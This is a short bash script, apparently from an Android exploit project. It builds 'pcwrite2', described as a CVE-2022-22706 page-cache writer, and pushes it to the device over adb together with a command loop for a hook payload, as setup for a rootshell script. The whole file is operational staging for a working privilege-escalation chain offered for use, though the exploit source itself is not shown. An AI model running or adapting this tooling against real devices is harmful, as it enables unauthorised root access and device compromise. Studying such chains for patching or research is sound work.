#!/usr/bin/env bash
# stage.sh -- build and push the device-side prerequisites the per-boot
# bring-up needs in $SU_DIR (default /data/local/tmp):
#
#   pcwrite2   the CVE-2022-22706 page-cache writer (channel/pcwrite2.c)
#   r.sh       the command loop the hook payload execs
#
# These persist across a reboot, so this is a one-time (or after-wipe) step;
# channel/rootshell.sh assumes them present.  mali_boot is pushed and run by
# tools/pocrun.sh, not here.
#
#   NDK=<path> channel/stage.sh
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
REPO=$(cd "$HERE/.." && pwd)

if [ -z "${SER:-}" ]; then
    SER=$(adb devices | awk 'NR>1 && $2=="device" {print $1; exit}')
    [ -n "$SER" ] || { echo "stage.sh: set SER=<serial> (adb devices)"; exit 2; }
fi
D=${SU_DIR:-/data/local/tmp}

CC="${NDK_CC:-}"
if [ -z "$CC" ] && [ -n "${NDK:-}" ]; then
    CC=$(echo "$NDK"/toolchains/llvm/prebuilt/*/bin/aarch64-linux-android30-clang)
fi
[ -n "$CC" ] || { echo "stage.sh: set NDK=<android-ndk> (or NDK_CC=<clang>)"; exit 2; }

echo "[stage] building pcwrite2"
"$CC" -O2 -static -o "$HERE/pcwrite2" "$HERE/pcwrite2.c"

echo "[stage] pushing to $D"
adb -s "$SER" push -q "$HERE/pcwrite2" "$D/pcwrite2"
adb -s "$SER" push -q "$HERE/r.sh"     "$D/r.sh"
adb -s "$SER" shell "chmod 755 $D/pcwrite2 $D/r.sh && ls -l $D/pcwrite2 $D/r.sh"
echo "[stage] done -- now run channel/rootshell.sh"
